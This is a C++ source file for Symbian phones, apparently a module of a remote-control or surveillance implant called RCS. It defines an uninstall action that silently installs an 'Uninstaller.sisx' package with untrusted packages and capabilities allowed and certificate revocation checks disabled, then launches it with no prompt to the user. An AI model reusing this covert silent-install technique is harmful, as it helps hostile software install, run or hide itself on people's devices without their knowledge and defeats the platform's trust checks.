/*
 * ActionUninstall.cpp
 *
 *  Created on: 18/giu/2010
 *      Author: Giovanna
 */

#include <apgcli.h> // for RApaLsSession
#include <apacmdln.h> // for CApaCommandLine

#include <swinstapi.h>			// Uninstaller
#include <swinstdefs.h>

#include "ActionUninstall.h"


CActionUninstall::CActionUninstall() :
	CAbstractAction(EAction_Uninstall)
	{
	// No implementation required
	}

CActionUninstall::~CActionUninstall()
	{
	
	}

CActionUninstall* CActionUninstall::NewLC(const TDesC8& params)
	{
	CActionUninstall* self = new (ELeave) CActionUninstall();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionUninstall* CActionUninstall::NewL(const TDesC8& params)
	{
	CActionUninstall* self = CActionUninstall::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionUninstall::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
	}

void CActionUninstall::DispatchStartCommandL()
	{
		/**
		 * All the files are generated/downloaded into private app folder and automatically
		 * deleted during uninstall.
		 */
	
		/**
		 * Installation registry is not accessible through our capabilities.
		 */
	
		// Install the RCS uninstaller
		InstallAppL();
		
		// Launch Uninstaller
		LaunchAppL();
			
	}

void CActionUninstall::LaunchAppL(){
	
	TThreadId app_threadid;
	CApaCommandLine* cmdLine; 
	cmdLine=CApaCommandLine::NewLC();
	cmdLine->SetExecutableNameL(_L("Uninstaller.exe"));
	cmdLine->SetCommandL( EApaCommandRun );
	RApaLsSession ls;
	User::LeaveIfError(ls.Connect());
	TInt err=ls.StartApp(*cmdLine,app_threadid);
	ls.Close();
	CleanupStack::PopAndDestroy(); // cmdLine
}

void CActionUninstall::InstallAppL(){

	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
	
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
	  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
	    
	optionsPckg = options;
	
	TInt err = KErrNone;
	err = launcher.SilentInstall(_L("C:\\Private\\20030635\\Uninstaller.sisx"),optionsPckg);
	
	launcher.Close();
}

